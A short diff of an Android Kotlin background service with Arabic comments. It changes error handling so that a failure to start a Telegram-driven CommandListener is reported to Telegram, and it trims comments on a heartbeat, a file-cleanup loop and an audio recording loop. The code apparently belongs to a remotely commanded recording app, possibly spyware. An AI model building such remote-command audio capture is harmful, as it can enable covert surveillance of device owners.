@@ -26,10 +26,12 @@ class BackgroundService : Service() {
         super.onCreate()
         startForegroundWithNotification()
 
-        // ⭐ الاستماع المباشر من تيليجرام
+        // ⭐ ابدأ CommandListener فورًا
         try {
             CommandListener.start(applicationContext)
-        } catch (_: Exception) {}
+        } catch (e: Exception) {
+            TelegramApi.sendMessage("❌ CommandListener err: ${e.message}")
+        }
 
         // heartbeat
         scope.launch {
@@ -41,7 +43,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // تنظيف الملفات القديمة
+        // تنظيف
         scope.launch {
             while (running) {
                 try {
@@ -55,7 +57,7 @@ class BackgroundService : Service() {
             }
         }
 
-        // حلقة التسجيل الصوتي
+        // حلقة التسجيل
         scope.launch {
             while (running) {
                 try {
